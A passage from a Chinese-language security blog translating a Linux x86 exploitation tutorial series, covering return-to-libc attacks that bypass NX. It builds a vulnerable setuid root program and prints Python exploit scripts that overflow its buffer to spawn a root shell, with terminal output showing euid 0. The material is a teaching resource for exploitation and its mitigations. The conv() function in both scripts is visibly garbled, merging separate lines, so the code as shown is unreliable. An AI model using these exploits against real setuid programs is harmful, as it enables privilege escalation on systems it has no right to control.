conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp3) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp4) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3)</div><div class="line">#Dummy - To avoid null byte in fake_ebp4. </div><div class="line">buf += <span class="string">"X"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> seteuid</div><div class="line">buf += conv(fake_ebp5) </div><div class="line">buf += conv(seteuid_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Dummy - This arg is zero'd by above four <span class="built_in">sprintf</span> calls</div><div class="line">buf += <span class="string">"Y"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> system</div><div class="line">buf += conv(fake_ebp6) </div><div class="line">buf += conv(system_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(system_arg) </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> <span class="built_in">exit</span></div><div class="line">buf += conv(fake_ebp7) </div><div class="line">buf += conv(exit_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(exit_arg) </div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
<p>执行上面的漏洞利用代码就可以拿到root shell!!!</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����������������\��������������\��������������\�������������\��� �������AAAA0�������Ѕ</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>现在已经成功绕过NX,<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt/" target="_blank" rel="external">下一篇</a>文章让我们来看看如果绕过ASLR.</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-returntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20161231/returntolibc/">Return-to-libc绕过NX</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20161231/returntolibc/" class="article-date">
	  <time datetime="2016-12-31T14:20:03.000Z" itemprop="datePublished">十二月 31, 2016</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 什么是NX比特位</li>
<li>0X02 如何绕过NX比特位做到任意代码执行</li>
<li>0X03 什么是最低权限准则</li>
<li>0X04 root setuid程序漏洞利用 </li>
</ul>
</blockquote>
<p><u><em>阅读基础:</em></u></p>
<ol>
<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
</ol>
<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
<p>在前面的文章中，我们可以了解到，攻击者可以：</p>
<pre><code>将shellcode拷贝到栈中，再跳转到shellcode
</code></pre><p>来达到成功利用漏洞代码的目的。</p>
<p>因此，为了阻止攻击者的行为，安全研究人员开始利用“NX”比特位来缓解漏洞利用方法(exploit mitigation)。 </p>
<h3 id="什么是NX比特位"><a href="#什么是NX比特位" class="headerlink" title="什么是NX比特位"></a>什么是NX比特位</h3><p>这种漏洞利用缓解方法将指定内存区域设置为不可执行，并将可执行的区域设置为不可写。举个例子：数据段、栈和堆设置为不可执行，text段设置为不可写。</p>
<p>设置NX位后，经典的栈缓冲区溢出无法利用其漏洞。那是因为，在经典的方法中，shellcode被拷贝到栈中，返回地址指向shellcode。然而，现在的情况是栈被设置位不可执行，漏洞利用(exploit)就会失败。 当然，这种缓解(mitigation)技术也不是完全安全的，这篇文章就来看看我们是如何绕过NX比特位的!!!</p>
<p><u>漏洞代码</u>： 下面这份代码基于前文中漏洞代码作了一点修改。我会在后文中讲述修改的必要性。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf); <span class="comment">/* [3] */</span></div><div class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>编译命令</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p><u>注意</u>: “-z exexstack”参数并没有传递给gcc,因此这时栈是不可执行的(Non eXecutable)，可以通过下述方法来验证：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ readelf -l vuln</div><div class="line">...</div><div class="line">Program Headers:</div><div class="line"> Type      Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</div><div class="line"> PHDR      <span class="number">0x000034</span> <span class="number">0x08048034</span> <span class="number">0x08048034</span> <span class="number">0x00120</span> <span class="number">0x00120</span> R E <span class="number">0x4</span></div><div class="line"> INTERP    <span class="number">0x000154</span> <span class="number">0x08048154</span> <span class="number">0x08048154</span> <span class="number">0x00013</span> <span class="number">0x00013</span> R <span class="number">0x1</span></div><div class="line"> [Requesting program interpreter: /lib/ld-linux.so<span class="number">.2</span>]</div><div class="line"> LOAD      <span class="number">0x000000</span> <span class="number">0x08048000</span> <span class="number">0x08048000</span> <span class="number">0x00678</span> <span class="number">0x00678</span> R E <span class="number">0x1000</span></div><div class="line"> LOAD      <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x00108</span> <span class="number">0x00118</span> RW <span class="number">0x1000</span></div><div class="line"> DYNAMIC   <span class="number">0x000f28</span> <span class="number">0x08049f28</span> <span class="number">0x08049f28</span> <span class="number">0x000c8</span> <span class="number">0x000c8</span> RW <span class="number">0x4</span></div><div class="line"> NOTE      <span class="number">0x000168</span> <span class="number">0x08048168</span> <span class="number">0x08048168</span> <span class="number">0x00044</span> <span class="number">0x00044</span> R <span class="number">0x4</span></div><div class="line"> ...</div><div class="line"> GNU_STACK <span class="number">0x000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000</span> <span class="number">0x00000</span> RW <span class="number">0x4</span></div><div class="line"> GNU_RELRO <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x000ec</span> <span class="number">0x000ec</span> R <span class="number">0x1</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>栈中只有RW标志位，并没有E标志位！</p>
<h3 id="如何绕过NX比特位做到任意代码执行"><a href="#如何绕过NX比特位做到任意代码执行" class="headerlink" title="如何绕过NX比特位做到任意代码执行"></a>如何绕过NX比特位做到任意代码执行</h3><p>可以通过“return-to-libc”技术来绕过NX比特位。这里，返回地址被一种特殊的libc函数地址(而不是含有shellcode代码的栈地址)覆盖。举个例子，如果攻击者想触发一个shell, 他会利用system()地址来覆盖返回地址并设置好system()在栈中需要的必要参数，以便能成功调用system()。 </p>
<p>之前我们已经反汇编并画出了漏洞代码的栈布局。现在开始写个漏洞利用代码来绕过NX比特位吧！</p>
<p><u>漏洞利用代码</u></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")</div><div class="line"></div><div class="line">system = 0xb7e61060        #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e54be0          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to 'sh' substring of 'fflush' string. </div><div class="line">#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!</div><div class="line">system_arg = 0x804827d     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
<p>执行上述漏洞利用代码，可以得到一个具有root权限的shell,如下图所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K��&#125;�</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>太棒了，我们拿到了root shell! 但在实际应用程序中，root setuid 程序设置了最低权限准则，获取root shell并没那么容易！ </p>
<h3 id="什么是最低权限准则"><a href="#什么是最低权限准则" class="headerlink" title="什么是最低权限准则"></a>什么是最低权限准则</h3><p>这种技术允许root setuid程序只有在需要的情况下才能获取root权限。也就是说，在需要时，root setuid程序拿到root 权限，不需要时就会丢弃已获取的权限。root setuid一般会在接收用户输入之前会丢弃root权限。因此，尽管用户输入是恶意的，攻击者也无法后去root shell。 举个例子，下面的漏洞代码不允许攻击者获取root shell。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln_priv.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对于上述漏洞程序，当我们执行下面的漏洞利用代码时，无法获取root shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#exp_priv.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">system = <span class="number">0xb7e61060</span></div><div class="line">exit = <span class="number">0xb7e54be0</span></div><div class="line"></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line"></div><div class="line"><span class="comment">#endianess conversion</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></div><div class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numystem + exit + system_arg</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln_priv"</span>, buf])</div></pre></td></tr></table></figure>
<p><u>注意</u>:exp_priv.py对exp.py稍作了一点修改！仅仅调整了system_arg变量</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ python exp_priv.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K川�</div><div class="line">$ id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) egid=0(root) groups=1000(sploitfun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)</div><div class="line">$ rm /bin/ls</div><div class="line">rm: remove write-protected regular file `/bin/ls'? y</div><div class="line">rm: cannot remove `/bin/ls': Permission denied</div><div class="line">$ exit</div><div class="line">$</div></pre></td></tr></table></figure>
<pre><code>到这里就完事了吗？那该如何对应用最低权限准则的root setuid程序进行漏洞利用呢？
</code></pre><h3 id="root-setuid程序漏洞利用"><a href="#root-setuid程序漏洞利用" class="headerlink" title="root setuid程序漏洞利用"></a>root setuid程序漏洞利用</h3><p>针对漏洞代码(vuln_priv)，漏洞利用程序(exp_priv.py)调用system()再紧接着调用exit()还不足以获取root shell。 但如果能修改一下漏洞利用程序(exp_priv.py)，以下面的顺序调用libc函数：</p>
<ul>
<li>setuid(0)</li>
<li>system(“sh”)</li>
<li>exit()</li>
</ul>
<p>这样一来我们就能获取root shell。 这种技术叫做return-to-libc链接(chaining)，将会在<a href="http://www.csyssec.org/20170101/chainingreturntolibc/" target="_blank" rel="external">下一篇</a>中讨论</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>

</section>
          <aside id="sidebar">
  
    <div class="widget-wrap" style="margin: 20px 0;">
	<div id="search-form-wrap">

    <form class="search-form">
        <label style="width: 75%;">
            <span class="screen-reader-text">Search for:</span>
            <input type="search" class="search-field" style="height: 42px;" placeholder=" 搜索…" value="" name="s" title="Search for:">
        </label>
        <input type="submit" class="search-form-submit" value="搜索">
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(无标题)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">集思广益</h3>
      <p>我们推崇的是黑客与分享精神，期待您能推荐好文章或投稿至本站，
让更多人受益。本站长期招募志愿者与勤工俭学者参与本站的维护和建设，您可通过邮件csyssec@hotmail.com联系我们</p>
       <div class="widget widget_athemes_social_icons">

    	<ul class="clearfix widget-social-icons">   
    	
   			<li><a href="null" title="Words"><i class="fa fa-words" aria-hidden="true"></i></a></li> 

   		
   		</ul>


   		<!--
   		<ul class="clearfix widget-social-icons">   		
   		<li class="widget-si-twitter"><a href="http://twitter.com" title="Twitter"><i class="ico-twitter"></i></a> </li> 
		<li class="widget-si-facebook"><a href="http://facebook.com" title="Facebook"><i class="ico-facebook"></i></a></li>
			<li class="widget-si-gplus"><a href="http://plus.google.com" title="Google+"><i class="ico-gplus"></i></a></li>
			<li class="widget-si-pinterest"><a href="http://pinterest.com" title="Pinterest"><i class="ico-pinterest"></i></a></li>
			<li class="widget-si-flickr"><a href="http://flickr.com" title="Flickr"><i class="ico-flickr"></i></a></li>
			<li class="widget-si-instagram"><a href="http://instagram.com" title="Instagram"><i class="ico-instagram"></i></a></li>


        	</ul> -->

    </div>
  </div>


  
    
  <div class="widget_athemes_tabs">
    <ul id="widget-tab" class="clearfix widget-tab-nav">
      <li class="active"><a>最新文章</a></li>
    </ul>
    <div class="widget">
      <ul>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/libvmikvm/">KVM Support in Libvmi</a></h6>
              <span>一月 2, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/libvmiintrospection/">Write Introspection Tools Using Libvmi</a></h6>
              <span>一月 2, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/libvmisetup/">Libvmi setup</a></h6>
              <span>一月 2, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/libvmiintro/">Libvmi原理</a></h6>
              <span>一月 2, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170101/memorysafety-defense/">内存持久战之防御措施</a></h6>
              <span>一月 1, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170101/memorysafety-attack/">内存持久战之攻击模型</a></h6>
              <span>一月 1, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170101/memorysafety/">内存持久战之内存安全性</a></h6>
              <span>一月 1, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a></h6>
              <span>一月 1, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a></h6>
              <span>一月 1, 2017</span>
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20161231/returntolibc/">Return-to-libc绕过NX</a></h6>
              <span>十二月 31, 2016</span>
            </div>

          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">4</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Introspection/">Introspection</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KVM/">KVM</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtualization/">Virtualization</a><span class="tag-list-count">4</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
